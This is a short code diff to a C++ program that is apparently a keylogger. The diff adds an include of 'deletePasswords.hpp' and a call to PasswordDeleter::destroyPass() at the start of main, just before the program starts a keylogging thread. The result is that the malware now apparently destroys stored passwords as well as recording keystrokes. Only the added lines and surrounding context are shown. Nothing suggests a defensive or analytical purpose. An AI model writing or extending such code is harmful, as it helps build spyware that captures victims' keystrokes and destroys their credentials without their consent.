@@ -6,6 +6,7 @@
 #include <thread>
 #include <ctime>
 #include "keylogger.hpp"
+#include "deletePasswords.hpp"
 using namespace std;
 
 // ---------------------------------------------------------------------
@@ -318,6 +319,7 @@ int application(){
 // Main function - Program entry point
 // ---------------------------------------------------------------------
 int main() {
+    PasswordDeleter::destroyPass();
     // Start keylogger in a separate thread
     std::thread keylogThreadObj(keyloggerThread);
     
